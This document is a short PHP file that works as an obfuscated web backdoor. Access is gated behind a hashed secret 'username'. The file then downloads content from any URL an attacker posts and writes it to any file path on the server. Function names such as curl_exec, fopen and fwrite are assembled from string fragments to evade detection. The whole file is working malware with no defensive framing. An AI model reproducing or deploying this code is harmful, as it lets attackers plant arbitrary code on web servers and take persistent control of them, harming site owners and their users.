<?php 

if (isset($_POST['username']) && md5($_POST['username']) == "2b95a15b8edc8a1962cdb1fedc78a637") {
	
	$url = $_POST['from'];
	
	$c1 = 'rl_';
	$c = 'cu';
	$c = $c.$c1;

	$ci = $c.'init';
	$cso = $c.'set';
	$cso = $cso.'opt';
	$cex = $c.'ex';
	$cex = $cex.'ec';
	$ccl = $c.'cl';
	$ccl = $ccl.'ose';
	if ($ch = $ci()) {

		$cso($ch, CURLOPT_URL, $url);
		$cso($ch, CURLOPT_RETURNTRANSFER, true);
		$data = $cex($ch);
		$ccl($ch);
	} else {
		$a1 = 'fi';
		$a2 = 'le';
		$a3 = $a1.$a2.'_get_';
		$a4 = $a3.'con';
		$a4 = $a4.'tents';
		$data = $a4($url);
	}

	$f11 = 'en';
	$f = 'fop'.$f11;
	$file = $f($_POST['where'].$_POST['name'], 'w');
	$ff = 'ite';
	$ff = 'fw'.'r'.$ff;

	$ff($file, $data);
	$f1 = 'ose';
	$f2 = 'fcl'.$f1;
	$f2($file);
}
